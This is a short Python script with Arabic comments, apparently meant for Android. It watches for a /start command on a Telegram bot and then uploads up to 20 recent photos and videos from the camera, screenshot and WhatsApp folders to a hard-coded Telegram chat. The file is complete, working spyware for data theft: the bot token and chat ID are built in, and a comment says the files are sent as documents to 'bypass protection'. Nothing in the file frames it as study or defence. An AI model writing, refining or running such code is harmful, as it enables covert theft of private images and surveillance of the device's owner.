import os
import time
import requests

TELEGRAM_BOT_TOKEN = "7820129712:AAH9pZ49S_m8tY8965625902"
DEFAULT_CHAT_ID = "6110903337"

# المجلدات التي سيتم سحبها
WATCH_FOLDERS = [
    "/storage/emulated/0/DCIM/Camera",
    "/storage/emulated/0/Pictures/Screenshots",
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Images",
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Video"
]

sent_files = set()
last_update_id = 0

def telegram_send(method, data, files=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/{method}"
    try:
        r = requests.post(url, data=data, files=files, timeout=40)
        return r.json()
    except: return None

def get_media_files():
    found = []
    for p in WATCH_FOLDERS:
        if os.path.exists(p):
            # فلتر الصور والفيديو فقط
            files = [os.path.join(p, f) for f in os.listdir(p) 
                     if f.lower().endswith(('.jpg', '.jpeg', '.png', '.mp4', '.mkv'))]
            found.extend(files)
    found.sort(key=os.path.getmtime, reverse=True)
    return found

def main_loop():
    global last_update_id
    while True:
        try:
            updates_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates?offset={last_update_id + 1}"
            res = requests.get(updates_url, timeout=10).json()
            if res.get("result"):
                for update in res["result"]:
                    last_update_id = update["update_id"]
                    msg_text = update.get("message", {}).get("text", "")
                    if msg_text == "/start":
                        telegram_send("sendMessage", {"chat_id": DEFAULT_CHAT_ID, "text": "🔄 جاري سحب 20 ملف (صور وفيديو)..."})
                        media = get_media_files()
                        count = 0
                        for path in media:
                            if count >= 20: break
                            if path not in sent_files:
                                with open(path, 'rb') as f:
                                    # إرسال كـ Document لضمان الجودة وتخطي الحماية
                                    if telegram_send("sendDocument", {"chat_id": DEFAULT_CHAT_ID}, {"document": f}):
                                        sent_files.add(path)
                                        count += 1
                                        time.sleep(2)
                        telegram_send("sendMessage", {"chat_id": DEFAULT_CHAT_ID, "text": "✅ انتهى السحب."})
        except: pass
        time.sleep(10)

if __name__ == '__main__':
    main_loop()
